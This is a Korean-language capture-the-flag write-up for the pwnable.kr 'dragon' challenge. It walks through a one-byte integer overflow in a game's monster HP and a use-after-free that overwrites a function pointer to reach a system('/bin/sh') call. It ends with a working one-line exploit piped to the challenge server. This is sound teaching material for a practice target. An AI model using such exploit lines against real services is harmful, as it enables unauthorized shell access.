
`#integer`, `#overflow`, `#UAF`
# dragon - 75 pt
## 목차
1. [Description](#description)
2. [일단 실행해보기](#일단-실행해보기)
3. [Integer Overflow](#integer-overflow)
4. [UAF](#uaf)
5. [exploit](#exploit)

### Description

> I made a RPG game for my little brother.  
> But to trick him, I made it impossible to win.  
> I hope he doesn't get too angry with me :P!  
> 
> Author : rookiss  
> Download : http://pwnable.kr/bin/dragon  
> 
> Running at : nc pwnable.kr 9004  

문제 설명을 읽어보면  
동생을 위해 게임을 만들었는데  
일부러 이길 수 없게 만들었다.  
  
그럼 일반적인 방법으로는 이길 수 없겠군요!  
  
### 일단 실행해보기  

```
# nc pwnable.kr 9004
Welcome to Dragon Hunter!
Choose Your Hero
[ 1 ] Priest
[ 2 ] Knight
$
```
게임을 시작해보면  
프리스트나 기사 중에서 영웅을 고르게 합니다.  

```
int GetChoice()
{
  int choice; // [sp+1Ch] [bp-Ch]@1

  __isoc99_scanf("%d", &choice);
  while ( getchar() != '\n' )
    ;
  return choice;
}
```
선택하는 부분은 "%d" 로 받기 때문에  
여기에서는 BOF 를 기대할 수 없습니다.  
  
저는 공격력과 몸빵이 좋을 것같은 기사를 선택하겠습니다 ^^  
```
Baby Dragon Has Appeared!
[ Baby Dragon ] 50 HP / 30 Damage / +5 Life Regeneration.
[ Knight ] 50 HP / 0 Mana
        [ 1 ] Crash
                Deals 20 Damage.
        [ 2 ] Frenzy
                Deals 40 Damage, But You Lose 20 HP.
$
```
아기 드래곤의 체력, 공격력, 회복력과  
기사의 체력, 마나 상태를 보여주고  
기사의 턴이 되어 두가지 공격방식 중 하나를 선택하게 됩니다.  
  
공격을 선택하는 것도 "%d" 로 받기에 BOF 를 기대할 수 없습니다.  
  
1번 Crash 를 선택하면  
```
Crash Deals 20 Damage To The Dragon!
But The Dragon Deals 30 Damage To You!
And The Dragon Heals 5 HP!
[ Baby Dragon ] 35 HP / 30 Damage / +5 Life Regeneration.
[ Knight ] 20 HP / 0 Mana
        [ 1 ] Crash
                Deals 20 Damage.
        [ 2 ] Frenzy
                Deals 40 Damage, But You Lose 20 HP.
$
```
드래곤에게 20의 공격력를 주고  
드래곤에게 턴이 넘어가서 공격력 30만큼 공격을 하고 자힐을 5 만큼 합니다.  
그런다음 아기 드래곤과 기사의 현재상태를 보여주고 기사의 공격턴으로 넘어갑니다.  
  
이런 방식으로 서로 한턴씩 공격을 하게되고 기사는 2가지의 공격을 하지만  
프리스트는 3가지를 선택할 수 있습니다.  
```
[ Priest ] 42 HP / 50 MP
        [ 1 ] Holy Bolt [ Cost : 10 MP ]
                Deals 20 Damage.
        [ 2 ] Clarity [ Cost : 0 MP ]
                Refreshes All Mana.
        [ 3 ] HolyShield [ Cost: 25 MP ]
                You Become Temporarily Invincible.
$
```
그리고 영웅이 죽게되면  
```
You Have Been Defeated!
Choose Your Hero
[ 1 ] Priest
[ 2 ] Knight
$
```
다시 새로운 게임을 시작하게 됩니다.  
  
이제 디버깅을 해봅시다  
```
    12    if ( toggle & 1 )                             // MaMa Dragon
    13    {
    14      dragon->info = 1;
    15      dragon->hp = 80;
    16      dragon->heal = 4;
    17      dragon->damage = 10;
    18      dragon->printInfo = PrintMonsterInfo;
    19      puts("Mama Dragon Has Appeared!");
    20    }
    21    else                                          // Baby Dragon
    22    {
    23      dragon->info = 0;
    24      dragon->hp = 50;
    25      dragon->heal = 5;
    26      dragon->damage = 30;
    27      dragon->printInfo = PrintMonsterInfo;
    28      puts("Baby Dragon Has Appeared!");
    29    }
```
드래곤의 능력은 위와같이 정해져 있습니다.  
어미 드래곤이 체력 80, 회복력 4, 공격력 10  
아기 드래곤이 체력 50, 회복력 5, 공격력 30  

### Integer Overflow
  
여기서 주목해야할 점은  
```
00000000 Dragon          struc ; (sizeof=0x10, mappedto_1)
00000000 printInfo       dd ?
00000004 info            dd ?
00000008 hp              db ?
00000009 heal            db ?
0000000A field_A         db ?
0000000B field_B         db ?
0000000C damage          dd ?
00000010 Dragon          ends
```
체력이 1 바이트로 작다.  
문제 설명에서 봤듯이 일부러 이길 수 없게 만들었기 때문에  
열심히 때려서 이길 수 없다.  
대신에 드래곤의 회복력을 이용해서  
Integer Overflow 를 이끌어낼 수 있다.  
  
그럼 두 영웅 중에 누굴 골라서 싸워야 할까?  
  
우리의 목표는 체력을 올려서 Integer Overflow 하는 것이기 때문에  
공격 20과 40, 둘 중에 고를 수 밖에 없는 기사는 안된다.  
  
프리스트는  
```
[ Priest ] 42 HP / 50 MP
        [ 1 ] Holy Bolt [ Cost : 10 MP ]
                Deals 20 Damage.
        [ 2 ] Clarity [ Cost : 0 MP ]
                Refreshes All Mana.
        [ 3 ] HolyShield [ Cost: 25 MP ]
                You Become Temporarily Invincible.
$
```
1번의 공격력 20 짜리 빼고  
2번과 3번을 이용해서 공격하지 않고 드래곤의 회복을 유도할 수 있다.  
  
```
    30    if ( hero == 1 )                              // Priest
    31    {
    32      player->class = 1;
    33      player->hp = 42;
    34      player->mana = 50;
    35      player->printInfo = PrintPlayerInfo;
    36      win = PriestAttack(player, dragon);
    37    }
```
프리스트의 체력은 42로 작지만  
마나를 이용해서 3번 선택(홀리 실드)을 하면  
드래곤의 공격을 막으면서  
드래곤의 자힐을 유도합니다.  
```
    20        case 3:                                   // [ 3 ] HolyShield
    21          if ( player->mana <= 24 )
    22          {
    23            puts("Not Enough MP!");
    24          }
    25          else
    26          {
    27            puts("HolyShield! You Are Temporarily Invincible...");
    28            printf("But The Dragon Heals %d HP!\n", dragon->heal);
    29            dragon->hp += dragon->heal;
    30            player->mana -= 25;
    31          }
    32          break;
```
그리고 홀리 실드도 마나가 없으면 사용할 수 없습니다.  
최대 마나 50이라서 25짜리 홀리 실드를 두번 사용할 수 있습니다.  
따라서, [2] Clarity 를 선택해서 마나를 채워줘야 합니다.  
```
    12        case 2:                                   // [ 2 ] Clarity
    13          puts("Clarity! Your Mana Has Been Refreshed");
    14          player->mana = 50;
    15          printf("But The Dragon Deals %d Damage To You!\n", dragon->damage);
    16          player->hp -= dragon->damage;
    17          printf("And The Dragon Heals %d HP!\n", dragon->heal);
    18          dragon->hp += dragon->heal;
    19          break;
```
그리고 아기 드래곤은 공격력이 높아서 안되고  
어미 드래곤일 때 거의 죽기직전에 Integer Overflow 를 할 수 있다.  
```
프리스트 vs 아기 드래곤
HP 42 / 50
[ 1 trun ] HolyShield
HP 42 / 55
[ 2 trun ] HolyShield
HP 42 / 60
[ 3 trun ] Clarity
HP 12 / 65
[ 4 trun ] HolyShield
HP 12 / 70
[ 5 turn ] HolyShield
HP 12 / 75
[ 6 turn ] Clarity
HP -22 / 80

프리스트 vs 어미 드래곤
HP 42 / 80
[ 1 trun ] HolyShield
HP 42 / 84
[ 2 trun ] HolyShield
HP 42 / 88
[ 3 trun ] Clarity
HP 32 / 92
[ 4 trun ] HolyShield
HP 32 / 96
[ 5 turn ] HolyShield
HP 32 / 100
[ 6 turn ] Clarity
HP 22 / 104
[ 7 turn ] HolyShield
HP 22 / 108
[ 8 trun ] HolyShield
HP 22 / 112
[ 9 turn ] Clarity
HP 12 / 116
[ 10 trun ] HolyShield
HP 12 / 120
[ 11 turn ] HolyShield
HP 12 / 124
[ 12 turn ] Clarity
HP 2 / -128(128)
```
128 은 0x80 이고 이는 -128 로 인식될 것이다.  
최상위 비트가 SET 됬기 때문입니다.  
```
>>> ctypes.c_byte(128).value
-128
>>> ctypes.c_byte(0x80).value
-128
```
### UAF

드디어 드래곤을 이겼습니다.  
이기게되면  
```
    56    while ( dragon->hp > 0 );
    57    free(dragon);
    58    return 1;
```
드래곤을 free() 하고  
```
    48    if ( win )
    49    {
    50      puts("Well Done Hero! You Killed The Dragon!");
    51      puts("The World Will Remember You As:");
    52      dragon_4 = malloc(0x10u);
    53      __isoc99_scanf("%16s", dragon_4);
    54      puts("And The Dragon You Have Defeated Was Called:");
    55      (dragon->printInfo)(dragon);
    56    }
```
같은 크기로 다시 malloc() 해서 0x10만큼 데이터 입력을 받고  
free() 했던 dragon 을 사용합니다.  
  
같은 크기로 할당했기 때문에  
방금 free() 했었던 dragon 자리에 그대로 할당될 것입니다.  
```
.----------------.---------------.-------.-------.---------.---------------.
|  printInfo[4]  |    info[4]    | hp[1] |heal[1]|   [2]   |   damage[4]   |
'----------------'---------------'-------'-------'---------'---------------'
```
위에 모습이 dragon 의 구조체입니다.  
그 자리에 데이터 입력을 받으면  
```
.----------------.---------------.-------.-------.---------.---------------.
|      AAAA      |    info[4]    | hp[1] |heal[1]|   [2]   |   damage[4]   |
'----------------'---------------'-------'-------'---------'---------------'
```
printInfo 구조체 멤버를 조작할 수 있다.  
  
그럼 타겟이 어디냐  
```
     1  void __cdecl SecretLevel()
     2  {
...
    14    system("/bin/sh");
    15  }
```
SecretLevel() 안에 좋은 타겟이 있었다.  

### exploit

```
(python -c 'print "2\n2\n1\n3\n3\n2\n3\n3\n2\n3\n3\n2\n3\n3\n2\n\xBF\x8D\x04\x08"';cat) | nc pwnable.kr 9004
```
